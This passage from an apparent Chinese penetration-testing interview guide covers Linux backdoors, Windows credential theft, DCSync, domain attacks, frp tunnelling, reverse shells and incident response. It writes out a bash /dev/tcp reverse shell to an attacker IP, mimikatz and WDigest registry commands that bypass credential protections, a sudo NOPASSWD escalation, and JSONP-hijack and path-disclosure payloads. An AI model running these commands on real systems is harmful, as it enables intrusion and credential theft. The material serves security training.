fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>13、strace后门<br>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><p>14、crontab反弹shell<br>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>15、openssh后门<br>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><p>16、PAM后门<br>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。</p><p>17、rootkit后门<br>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。<br><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">Linux权限维持–后门篇</a></p><ol start="31"><li>横向移动的各种姿势和原理</li></ol><p>见问题25，26</p><ol start="32"><li>@ 凭证获取(姿势&#x2F;常用&#x2F;原理&#x2F;对抗)</li></ol><p>Windows凭证保护机制及bypass：<br>1、LSA保护<br>自Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 sekurlsa::logonpasswords抓取密码会报错。</p><p>bypass：<br>(1) mimikatz运行lsadump::sam从磁盘上的SAM读取凭据，可成功bypass LSA Protection，读取到用户哈希<br>(2) mimikatz其中的mimidrv.sys驱动程序，可从lsass.exe进程中删除LSA保护，成功bypass LSA保护</p><p>2、Credential Guard(虚拟化保护)<br>在Windows 10和Windows Server 2016中，Microsoft启用Credential Guard（凭据防护），使用基于虚拟化技术来保护和隔离lsass进程，以保护凭证。启用Credential Guard后，lsass包含2个进程：正常LSA进程和隔离LSA进程（在VSM中运行）</p><p>bypass:<br>(1) mimikatz运行lsadump::sam从磁盘上的SAM读取凭据，可成功bypass Credential Guard，读取到全部的用户哈希<br>(2) SSP在用户登录时被调用，并接收该用户的凭据。在系统启动时SSP会被加载到进程lsass.exe中。</p><p>3、kb2871997补丁<br>kb2871997主要用来防止pth攻击，限制了两个sid（kb2871997会删除除了*wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用）</p><p>bypass:<br>(1) 修改注册表实现，需要重启：<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><br>(2) 锁屏实现：<br><code>rundll32.exe user32.dll LockWorkStation</code><br>(3) 使用截屏、键盘记录等后渗透功能，一般都要对应用户的空间下操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//cs</span><br><span class="line">desktop [explorer pid] x86|x64 low |higt</span><br><span class="line">//msf</span><br><span class="line">migrate [explorer pid]</span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/220991">Windows凭证机制浅析</a></p><ol start="33"><li>@ 如何对抗杀软加后门用户</li></ol><p>绕过敏感操作方式：白加黑。利用Windows系统的一些白文件去执行相应的敏感操作。<br>绕过流量特征方式：<br>(1) TCP分段。指的是数据包在传输过程中切分后以小段传输(效果不错，但网络不好容易断)<br>(2) 内容加密。针对传输内容加密混淆，比如执行命令的字符串<br>(3) 使用合法证书。<br><a href="https://0range-x.github.io/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/">浅析杀软</a></p><ol start="34"><li>chrome dump密码的原理，如果让你写个工具，思路是什么？（或者别人工具的实现原理）</li></ol><p>chrome dump密码的原理：<br>正常用户访问网站时，可选择使用Chrome浏览器保存登录的用户密码，用于下次登录的时候Chrome自动填写登录密码<br>Chrome中保存的密码先被二次加密(通过Windows API CryptProtectData()实现)，然后被保存在SQLite数据库文件中，位置如下：<br><code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code><br>解密需要获得三部分内容：<br>(1) 加密密钥(即Master Key文件)，位于%appdata%\Microsoft\Protect下对应sid文件夹下的文件<br>(2) 数据库文件Login Data<br>(3) 用户明文的密码，用于解密加密密钥</p><p>简单的方式(适用于部分非直接登录的站点)：<br>直接登录对应的网站，通过F12修改密码框字段属性为 <code>value type = &quot;text&quot;</code><br>即可显示密码</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">导出Chrome浏览器中保存的密码</a><br><a href="https://www.huwoo.net/2020/post-4150.html">离线导出Chrome浏览器中保存的密码</a><br><a href="https://yinhaoqin.com/%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E5%87%BA%E5%AF%86%E7%A0%81/">浏览器导出密码</a><br><a href="https://cloud.tencent.com/developer/article/2204689">最全的内网凭据密码收集方法和技巧总结</a></p><ol start="35"><li>PTH哈希传递</li></ol><p>见问题29</p><ol start="36"><li>@ DCsync原理，DCsync是哪个协议？</li></ol><p>当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步，而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC &#x2F; DCE&#x2F;RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI(这个在后面抓包可以看到)。</p><p>DCsync原理：<br>在不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync通过 DRS(Directory Replication Service) 服务的 GetNCChanges 接口向域控发起数据同步请求，从域控制器复制用户哈希凭据。</p><p>利用DCSync导出域内用户的哈希值，本质上就是利用DRS(Directory Replication Service)协议通过 IDL_DRSGetNCChanges 从域控制器复制用户哈希凭据，以便进一步进行利用。<br>对拥有“复制目录更改（DS-Replication-Get-Changes）、全部复制目录更改 (DS-Replication-Get-Changes-All )、在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）”三条DACL的域用户，向域控发出数据同步请求，从而去dump域内用户hash。<br>默认本地管理员，域管理员或企业管理员以及域控制器计算机账户得成员默认具有上述权限。<br>注意，默认情况下，DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。</p><p>DCsync是：DRS(Directory Replication Service)协议。<br><a href="https://tttang.com/archive/1634/">DCSync 技术的攻击和检测</a><br><a href="https://www.secpulse.com/archives/186924.html">基于AD Event日志识别DCSync攻击</a></p><ol start="37"><li>@ 有台Windows域内机器，如何打域控？</li></ol><p>Windows攻击域控的方式：<br>1、高权限读取本地密码(procdump+mimikatz绕过杀软)<br>2、SYSVOL组策略获取密码<br>3、Kerberoasting暴力破解密码<br>4、内网协议NTLM之内网大杀器CVE-2019-1040漏洞<br>5、CVE-2020-1472-ZeroLogon<br>6、MS14-068漏洞进行提权<br>7、窃取域管理员令牌<br>8、进程迁移</p><p><a href="https://blog.csdn.net/qq_53742230/article/details/126082408">Windows 内网渗透之攻击域控</a></p><ol start="38"><li>webshell 提权（低权限到高权限）</li></ol><p>见问题2</p><ol start="39"><li>已经拿到webshell，说说你的内网思路</li></ol><p>拿到webshell，内网思路：<br>探测系统信息，提权，针对Windows想办法开启远程桌面连接，针对Linux想办法使用反弹shell来本地连接。<br>(1) 探测系统信息：whoami(查看当前权限)，netuser(查看用户&#x2F;组)，systeminfo(查看系统补丁修复情况)等常见命令<br><a href="https://cloud.tencent.com/developer/article/1036438">内网渗透测试思路（二）</a></p><ol start="40"><li>不允许扫描，如何横向</li></ol><p>总体思路就是两种：要么不扫描，要么扫描不被发现。<br>如果不扫描，那么就使用无扫描渗透测试工具；侧信道攻击；还有社工和物理渗透。<br>如果扫描不被发现，就需要进行隐藏：使用应用层代理工具，比如SSH隧道；端口转发和端口隧道；DNS隧道；数据编码和隐蔽通信。</p><p>(1) 无扫描渗透测试工具： 一些专门的渗透测试工具允许执行渗透测试而不触发传统的扫描检测。这些工具可能使用更智能的技术，以避免被IDS&#x2F;IPS（入侵检测系统&#x2F;入侵防御系统）检测到，从而进行横向移动。例如，Cobalt Strike 和Metasploit Beacon。<br>(2) 应用层代理：使用应用层代理工具，如SSH隧道或代理工具，可通过目标网络进行横向移动，而不会触发传统扫描检测。这些工具可以将流量伪装成合法的应用层通信，以避免被检测到。<br>(3) 端口转发和端口隧道：使用工具如 <code>ssh -L</code> 或 <code>ssh -R</code> ，可以在目标系统之间建立端口转发或反向隧道，从而使流量通过建立已建立的连接进行传输，而不触发扫描检测。<br>(4) DNS隧道：使用DNS隧道工具，可以通过DNS请求和响应来传输数据，这通常不会被视为扫描活动。工具如Dnscat2或lodine可用于此目的。<br>(5) 数据编码和隐蔽通信：将数据编码为看似正常通信的形式，例如使用Base64编码或其它编码技术。可以在网络上流动而不引起警觉。<br>(6) 侧信道攻击：利用目标系统的侧信道信息，如CPU利用率、电源消耗等，来执行攻击并获取信息，而不触发扫描检测。<br>(7) 社交工程和物理渗透：利用社交工程技巧或物理访问，可以获取目标系统的凭据或物理访问权限，从而进行横向移动。</p><p>侧信道攻击是一种安全漏洞利用技术，它不是通过直接攻击系统的计算能力或漏洞来获取信息，而是通过观察目标系统在执行某些操作时泄露的辅助信息来获取敏感数据。</p><ol start="41"><li><p>存在杀软，不允许exe落地，怎么办<br>使用无文件攻击技术：无文件攻击技术不需要将可执行文件写入磁盘，而是利用操作系统和应用程序的功能来执行恶意代码。这种方法可以绕过杀软的检测。例如，可以使用PowerShell或JavaScript来运行脚本，而不需要生成可执行文件。<a href="https://zhuanlan.zhihu.com/p/65152928">无文件攻击的各种姿势</a>, <a href="https://www.freebuf.com/articles/system/263960.html">常见的windows下无文件落地攻击手法</a></p></li><li><p>常用的提权姿势</p></li></ol><p>见问题2</p><ol start="43"><li>@ 内网代理（详细问了frp）</li></ol><p>frp是一个国人开发的非常易用的内网穿透工具，可以借助具有公网IP的服务器，建立从公网到内网的通道。</p><p>frp使用server&#x2F;client的模式。一般来说，frps (server)运行在具有公网ip的服务器上，而frpc (client)运行在内网的服务器上。frpc连接到frps后，公网用户可以访问frps的ip与特定端口，访问对应的frpc。因此，抛开网络环境，使用frp最基础的条件就是，user与client都可以主动通过ip连接server。</p><p>FRP工作原理介绍<br>1、首先启动frpc，frpc启动后会向frps注册。也就是内网WEB服务器会向VPS请求注册。<br>2、客户端请求frps。也就是当我们的攻击机去访问frps。<br>3、frps告知frpc有新请求，需要建立连接。也就是VPS告知内网WEB服务器，需要建立连接。<br>4、frps收到frpc的请求，建立新的连接。也就是VPS接收到了内网WEB服务器的请求，建立了新的连接。<br>5、frps把frpc和攻击机的流量互相转发，将frps服务器当成流量中转站。也就是VPS将攻击机的流量转发给内网WEB服务器，把内网WEB服务器的流量转发给攻击机。<br><a href="https://shaoyecheng.com/uncategorized/2021-05-28-%E4%BD%BF%E7%94%A8frp%E4%B8%BA%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BD%91.html">用frp为内网服务器代理上网</a><br><a href="https://zhuanlan.zhihu.com/p/403361038">内网渗透之FRP代理工具详解</a></p><ol start="44"><li>内网如何反弹shell，反弹的shell流量如何屏蔽<br>内网反弹shell的类别：<br>(1) 利用netcat反弹shell<br>(2) 利用bash反弹shell<br>(3) Curl配合bash反弹shell(最近爆出漏洞)<br>(4) 将反弹shell的命令写入&#x2F;etc&#x2F;profile文件<br>(5) 利用Socat反弹shell<br>(6) 利用Telnet反弹shell<br>(7) 利用awk反弹shell<br>(8) 各种脚本反弹shell</li></ol><p>内网反弹shell的流程（以bash反向反弹为例）：<br>1、目标机器反弹shell: <code>bash -i &gt;&amp; /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&gt;&amp;1</code><br>2、攻击机接收反弹来的shell: <code>nc -lvvp 攻击机接收shell的端口</code><br>3、使用 <a href="https://github.com/neurobin/shc">shc工具</a> 加密bash脚本，加密后生成一个C源代码和编译的二进制文件，把编译后的二进制文件上传到目标机器执行。可隐藏ip。<br>4、不能弹shell的情况：相关bash，nc命令被限制。那么尝试提权。<br>5、能弹shell但收不到：查看目标是否限制出网或出站端口。<br>如果出网则尝试提权，如果限制出站端口则批量尝试常见端口（在自己的vps上,通过nginx监听多个端口来快速启动多个端口,然后再在目标机器上上传个sh脚本,批量curl自己vps的指定端口,最后看一下结果就可以了,nmap —top-ports 100或1000可以扫描nmap整理的100或1000个最常用的端口）<br><a href="https://xz.aliyun.com/t/11459">反弹shell流程</a></p><p>反弹流量屏蔽方式：使用 <a href="https://github.com/iagox86/dnscat2">DNScat2</a> ，建立DNS隧道，屏蔽流量特征</p><ol start="45"><li><p>除了TCP&#x2F;IP协议，如何将内网数据传递出来（内网环境有着严格防御与审查）<br>1、尝试icmp，如果能ping通外网主机，一般都能出网。<br>2、尝试应用层协议出网，比如HTTP, SSH, DNS, RDP等应用层协议；通常办公网是允许HTTP协议出网的，可能会域名白名单限制</p></li><li><p>@ 有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网进行其它探测？<br>有。<br>内网渗透流程：<br>1、拿到权限。通过exp进入主机，判断系统信息，获取当前目录路径，在当前目录写入一句话木马并连接，然后上传免杀马，最后上线。<br>2、权限维持。方法有设置延迟时间，注入进程使进程迁移，将木马隐藏在启动项下，使用计划任务。<br>3、主机信息收集。收集内容包括：主机信息 <code>systeminfo</code> ，网络信息 <code>ipconfig /all</code> ，路由表 <code>arp -a</code> ，进程 <code>tasklist</code> ，端口占用 <code>netstat -ano</code> ，是否域环境 <code>net user /domain</code> ，是否出网 <code>ping baidu.com -n 2</code> ，浏览器保存密码(使用工具)<br>4、隧道搭建。传入ew执行命令连接服务器等socks，传入frp客户端和配置文件并运行命令<br>5、横向移动。通过之前拿到的各种账号密码，登入常见服务如phpmyadmin<br>6、内网信息收集。内容：当前权限，网络配置信息，系统信息，敏感信息，域内信息(当前域，域用户，指定域用户详细信息，域控，域内用户详细信息，域控主机名)<br>7、提权。内核提权，计划任务提权，protato等。<br>8、横向移动。获取hash，pth等。<br>9、PTT(票据传递)。黄金票据，白银票据。</p></li></ol><p>探测方式：<br>首先使用代理进入内网regeorg、ew等<br>第二在本机进行信息收集，包括管理员ip、端口服务、账号密码、路由信息、网段信息等<br>第三扩展到收集到的网段进行渗透，利用常用服务:SMB、MYSQL、SQLserver、ftp、telnet等<br>借助轻量化脚本或扫描器扫描，但一般不这么做，动静太大容易被管理员发现<br>第四通过系统中存在的漏洞提权<br><a href="https://xz.aliyun.com/t/11784">通过边界代理一路打到三层内网+后渗透通用手法</a></p><ol start="47"><li><p>主机疑似遭到入侵，要看哪里的日志？<br>1、系统登录日志<br>2、服务访问日志<br>3、网站日志<br>4、数据库日志</p></li><li><p>@ DDOS有哪些？CC攻击是什么，区别是什么<br>DDOS使分布式拒绝服务攻击，利用服务请求来占用过多的资源，从而使合法用户无法得到服务响应。<br>主要方式(整体层面)：<br>1、容量耗尽攻击: UDP Flood<br>2、协议攻击: SYN Flood<br>3、资源层攻击: HTTP GET<br>主要方式(具体层面)：<br>1、SYN Flood<br>2、UDP Flood<br>3、ICMP Flood<br>4、Connection Flood<br>5、HTTP Get<br>6、UDP DNS Query Flood</p></li></ol><p>CC攻击：模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU长时间处于100%，网络拥塞。</p><p>二者区别：<br>CC攻击网页，DDOS攻击服务器<br>CC门槛较低，DDOS需要大量服务器<br>CC持续时间长，DDOS产生的影响大</p><ol start="49"><li><p>land攻击<br>land(Local Area Network Denial Attack)，是局域网拒绝服务攻击。DDOS的一种，通过发送精心构造的具有相同源地址和目标地址的欺骗数据包，致使缺乏相应防护机制的目标设备瘫痪。</p></li><li><p>绕过waf常用方法<br>见问题18</p></li><li><p>@ 信息收集都收集哪些信息<br>公司级别：企查查搜索公司和子公司信息，获得域名，并且通过oneforall搜索子域名信息。通过站长之家，whois等查找域名信息。<br>域名级别：使用工具批量获取子域名，查旁站。<br>IP级别：使用fofa，zoomeyes查找信息，通过SHA-1(SSL Lab)查找真实ip，域名转IP，C段信息。<br>web级别：识别网站框架cms，用插件Wappalyzer；路径收集，使用dirbuster，dirsearch，御剑等；敏感信息收集，使用JSFinder<br>主机级别：查看主机信息，如systeminfo；网络信息，如ipconfig &#x2F;all；查看路由，如arp -a；进程 tasklist；端口占用 netstat -ano；是否域环境 net user &#x2F;domain；是否出网 ping baidu.com -n 2；浏览器保存密码(使用工具)<br>内网级别：当前权限，网络配置信息，系统信息，敏感信息，域内信息(当前域，域用户，指定域用户详细信息，域控，域内用户详细信息，域控主机名)<br>见 信息收集 篇<br>见问题46</p></li><li><p>获取shell之后，你是怎么提权的？<br>见Windows提权问题3和Linux提权问题3</p></li><li><p>进入到内网之后，怎么去维持权限？<br>Windows：计划任务，注册表自启动服务，映像劫持，logon scripts后门，DCsync，DSRM，Skeleton Key(万能密码)<br>Linux：添加超级用户，suid权限维持，ssh私钥免密登录，定时任务，rootkit后门</p></li><li><p>讲一下黄金票据<br>见问题27</p></li><li><p>@ 讲一下APP渗透<br>首先准备阶段：定义安全测试的范围，包括确认适用的安全控制点、受控方的测试目标和敏感数据。同时在开展渗透测试前，应拿到书面盖章授权。<br>然后开始信息收集：<br>包括APP的环境信息、业务用例和架构等信息。<br>应用描绘：确定潜在漏洞风险高低对其进行排序，以便确认渗透测试的攻击路径，制定相应的测试用例。<br>漏洞利用和测试工具开发<br>提交报告<br>Activity组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">activity绑定browserable与自定义协议</span><br><span class="line">ActivityManager漏洞</span><br></pre></td></tr></table></figure></li></ol><p>Service</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">权限提升，拒绝服务攻击</span><br></pre></td></tr></table></figure><p>Broadcast Receiver组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">权限管理不当</span><br><span class="line">Broadcast Receiver导出漏洞</span><br><span class="line">动态注册广播组件暴露漏洞</span><br></pre></td></tr></table></figure><p>Content Provider组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读写权限漏洞</span><br><span class="line">Content Provider中的SQL注入漏洞</span><br><span class="line">Provider文件目录遍历漏洞</span><br></pre></td></tr></table></figure><ol start="56"><li><p>如果抓不到包，是因为什么<br>app抓不到包原因：<br>因为高版本的安卓和微信不再信任系统的证书，安卓7之后对证书的策略进行变更，这会造成无法抓包的情况，所以需要把我们的burp证书变为安卓系统证书，从而让操作系统信任。</p></li><li><p>了解APT<br>APT(Advanced Persistent Threat)，高级可持续威胁。包含三个要素：高级、长期、威胁。</p></li></ol><p>常见APT组织：<br>APT-32&#x2F;海莲花<br>TA505<br>震网攻击</p><p>特点：<br>攻击者组织严密：往往是一个组织发起的攻击，可能具有军事或政治目的，有时会与某个国家关联在一起，而且背后往往有强大的资金支持。<br>针对性强：攻击者不会盲目攻击，一般会很有针对性的选择一个攻击目标，该目标往往具有军事、政治、经济上的较高价值。<br>手段高超：APT攻击的恶意代码变种多且升级频繁，结合尚未发布的零日漏洞，使得基于特征匹配的传统检测防御技术很难有效检测出攻击。<br>隐蔽性强：APT攻击者具有较强的隐蔽能力，不会像DDoS攻击一样构造大量的报文去累垮目标服务器，基于流量的防御手段很难发挥作用；在整个过程中都会使用高级逃逸技术来刻意躲避安全设备的检查，在系统中并无明显异常，基于单点时间或短时间窗口的实时检测技术和会话频繁检测技术也难以成功检测出异常攻击。<br>持续时间长：攻击者一般都很有耐心，渗透过程和数据外泄阶段往往会持续数月乃至数年的时间。</p><ol start="58"><li><p>怎么测内网，怎么访问敏感文件<br>测内网见问题46<br>访问敏感文件太宽泛了。Linux使用命令cat读取</p></li><li><p>写shell需要什么权限吗？你怎么判断存在写入权限？如果没有写入权限，还能有什么办法吗？<br>写shell需要可访问权限，可写权限或可上传权限，可知绝对路径，可执行。<br>判断存在写入权限：<br>chown</p></li></ol><p>没有写入权限就上传呗</p><ol start="60"><li><p>@ 怎么获得绝对路径呢？没有报错呢？不能读取文件呢？<br>1、单引号引起数据库报错<br>2、访问错误参数或错误路径<br>3、探针类文件如phpinfo<br>4、扫描开发未删除的测试文件<br>5、google hacking<br>6、phpmyadmin爆路径：&#x2F;phpmyadmin&#x2F;libraries&#x2F;lect_lang.lib.php<br>7、利用漏洞读取配置文件找路径<br>8、恶意使用网站功能，如本地图片读取功能读取不存在图片，上传点上传不能正常导入的文件<br>9、源代码读取路径</p></li><li><p>怎么找到域控机<br>见问题8</p></li><li><p>webshell你会利用哪些办法来绕过？<br>1、超短shell<br>2、编码：base64<br>3、文件格式：GIF89a</p></li><li><p>不用工具的前提下，如何搜集子域名？<br>google, fofa: site&#x3D;”xxx.com”</p></li><li><p>渗透测试过程中如何信息收集，说一下渗透测试信息收集的办法？<br>见问题51</p></li><li><p>在渗透过程中常用的编码有哪些？<br>UTF-8, ASCII</p></li><li><p>渗透测试过程中如何判断对方操作系统是什么系统？<br>Linux大小写敏感，Windows大小写不敏感<br>TTL时间，一般100以上是Windows，100以下是Linux</p></li><li><p>你是怎么知道对方网站使用了哪些常用cms系统搭建的（指纹信息是什么）<br>一般直接使用工具或在线识别：<br>Wappalyzer<br>EHole指纹识别</p></li></ol><p>手动识别：<br>根据HTTP响应头判断，重点关注X-Powered-By、Cookie等字段。<br>根据HTML特征，重点关注body、title、meta等标签的内容和属性。<br>根据特殊的CLASS类型判断，HTML中存在特定CLASS属性的某些DIV标签。</p><ol start="68"><li><p>如何寻找网址物理路径？<br>1、单引号爆路径: <code>http://localhost/news.php?id=100&#39;</code><br>2、错误参数值爆路径: <code>http://localhost/news.php?id=-1</code><br>3、通过搜索引擎获取: <code>Site:baidu.com warning</code> <code>Site:baidu.com  &quot;fatal error&quot;</code><br>4、测试文件获取路径: <code>/test.php</code><br>5、配置文件获取路径: <code>c:\windows\php.ini</code><br>6、nginx文件类型错误解析路径: <code>http://localhost/top.jpg/x.php</code><br>7、phpmyadmin爆路径: <code>/phpmyadmin/themes/darkblue_orange/layout.inc.php</code><br>8、配合远程代码执行漏洞: <code>比如eval()函数可控的话，直接传入phpinfo()，通过phpinfo页面中Document_Root参数获取网站绝对路径</code></p></li><li><p>@ 如何创建一个用户并且提权<br>Linux:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">useradd abc  //创建用户abc</span><br><span class="line">passwd 123    //设置密码</span><br><span class="line">sudo      //提权</span><br><span class="line">vi sudo   //编辑sudo</span><br><span class="line"></span><br><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">添加配置，如 %abc ALL=(ALL)ALL 或 %abc ALL=NOPASSWD:ALL 保存退出</span><br><span class="line">再在abc用户下使用，操作需要权限的命令时，再加上sudo</span><br><span class="line">切换到root账号：sudo su -</span><br></pre></td></tr></table></figure></li><li><p>谷歌排行第一的CMS有1000个旁站，问怎么入侵<br>尝试回答一下。<br>通过Google hacking，fofa等查找后台。</p></li><li><p>使用谷歌语法查询指定域名的子域名，并且搜索他的后台登录<br>搜索子域名: <code>site:&quot;*.bangumi.tv&quot;</code><br>搜索后台登录:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin</span><br><span class="line">inurl:user</span><br><span class="line">inurl:login</span><br><span class="line">inurl:manage</span><br><span class="line">inurl:system</span><br><span class="line">inurl:cms</span><br></pre></td></tr></table></figure></li><li><p>对没有挂到dns上的网站如何进行入侵？</p></li><li><p>端口扫描时，都关注哪些端口，分别代表什么？<br>21: FTP  22: SSH  23: Telnet  53: DNS  1433: MSSQL  1521: Oracle  3306: MySQL  27017: Mongodb  3389: RDP  69: TFTP  80: HTTP </p></li><li><p>jsonp安全攻防技术，怎么写jsonp的攻击页面？<br>涉及到Jsonp的安全攻防内容：JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。<br>攻击页面<br>JSON劫持，跨域劫持敏感信息，页面类似于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wooyun</span>(<span class="params">v</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(v.<span class="property">username</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p></li><li><p>@ 挖矿病毒应急响应<br>1、原因排查<br>出现异常情况，如CPU占用率很高。开始排查，一旦发现服务器被挖矿，应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有上述经常被恶意利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查找到原因<br>2、清除木马<br>(1) 及时隔离主机<br>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用，所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析<br>(2)删除文件、阻断与矿池通讯<br>iptables -A INPUT -S xmr.crypto- pool.fr -j DROP<br>iptables -A OUTPUT -d xmr.crypto- pool.fr -j DROP<br>(3)清除定时任务<br>大部分挖矿进程会在受感染主机中写入定时任务来完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或者直接执行挖矿脚本，导致挖矿进程清除失败<br>(4)清除启动项<br>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动，所以在清除时还应该关注启动项中的内容如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除<br>(5)kill 挖矿进程<br>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底<br>在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式， 并按照顺序进行清除， 避免清除不彻底<br>(6)清除公钥文件<br>在用户 home 目录的 .ssh 目录下放置 authoruzed_keys 文件，从而免密登录该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机</p></li><li><p>@ 勒索病毒应急响应<br>场景：<br>某天早上，网站管理员打开OA系统，首页访问异常，显示乱码</p></li></ol><p>事件分析：<br>登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件<br>打开!HELP_SOS.hta文件，显示“文件恢复指南”，基本可以确认是服务器中了勒索病毒<br>上传样本到360勒索病毒网站，发现无法解密。试一试勒索病毒解密工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">360安全卫士勒索病毒专题</span><br><span class="line">http://lesuobingdu.360.cn</span><br></pre></td></tr></table></figure><p>防范措施：<br>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br><span class="line">4、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line">5、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure><ol start="77"><li>如何发现钓鱼邮件并处置<br>发现：邮件系统异常登录告警、员工上报、异常行为告警、邮件蜜饵告警<br>防御：<br>屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问<br>(1) 根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽<br>(2) 邮件内容涉及域名、IP 均都应该进行屏蔽<br>(3) 